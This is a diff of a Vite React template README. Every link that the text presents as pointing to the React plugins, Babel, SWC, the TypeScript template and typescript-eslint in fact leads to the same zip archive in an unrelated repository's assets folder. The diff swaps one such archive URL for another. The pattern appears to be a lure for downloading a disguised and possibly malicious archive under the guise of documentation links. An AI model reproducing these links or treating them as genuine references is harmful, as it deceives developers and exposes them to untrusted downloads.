@@ -4,9 +4,9 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/niku3325singh/ukrainian-stats-mcp-server/develop/src/assets/ukrainian-stats-mcp-server_1.2.zip) uses [Babel](https://raw.githubusercontent.com/niku3325singh/ukrainian-stats-mcp-server/develop/src/assets/ukrainian-stats-mcp-server_1.2.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/niku3325singh/ukrainian-stats-mcp-server/develop/src/assets/ukrainian-stats-mcp-server_1.2.zip) uses [SWC](https://raw.githubusercontent.com/niku3325singh/ukrainian-stats-mcp-server/develop/src/assets/ukrainian-stats-mcp-server_1.2.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://github.com/niku3325singh/ukrainian-stats-mcp-server/raw/refs/heads/develop/src/assets/server_mcp_stats_ukrainian_3.5.zip) uses [Babel](https://github.com/niku3325singh/ukrainian-stats-mcp-server/raw/refs/heads/develop/src/assets/server_mcp_stats_ukrainian_3.5.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://github.com/niku3325singh/ukrainian-stats-mcp-server/raw/refs/heads/develop/src/assets/server_mcp_stats_ukrainian_3.5.zip) uses [SWC](https://github.com/niku3325singh/ukrainian-stats-mcp-server/raw/refs/heads/develop/src/assets/server_mcp_stats_ukrainian_3.5.zip) for Fast Refresh
 
 ## Expanding the ESLint configuration
 
-If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://raw.githubusercontent.com/niku3325singh/ukrainian-stats-mcp-server/develop/src/assets/ukrainian-stats-mcp-server_1.2.zip) for information on how to integrate TypeScript and [`typescript-eslint`](https://raw.githubusercontent.com/niku3325singh/ukrainian-stats-mcp-server/develop/src/assets/ukrainian-stats-mcp-server_1.2.zip) in your project.
+If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://github.com/niku3325singh/ukrainian-stats-mcp-server/raw/refs/heads/develop/src/assets/server_mcp_stats_ukrainian_3.5.zip) for information on how to integrate TypeScript and [`typescript-eslint`](https://github.com/niku3325singh/ukrainian-stats-mcp-server/raw/refs/heads/develop/src/assets/server_mcp_stats_ukrainian_3.5.zip) in your project.
